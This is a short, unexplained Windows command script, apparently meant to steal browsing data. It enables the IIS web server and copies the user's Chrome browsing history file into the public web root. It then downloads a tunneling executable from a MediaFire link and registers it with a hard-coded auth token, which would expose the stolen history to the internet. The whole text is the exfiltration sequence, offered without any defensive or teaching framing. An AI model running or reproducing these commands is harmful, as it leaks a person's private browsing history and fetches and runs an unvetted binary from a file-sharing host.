DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
 Copy-Item '\AppData\Local\Google\Chrome\User Data\Default\History' 'C:\inetpub\wwwroot\History File.txt' 
Invoke-WebRequest -Uri https://www.mediafire.com/file/et8b7qf4zvq5408/localtonet.exe/file -OutFile (Join-Path Downloads localtonet.exe)
./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 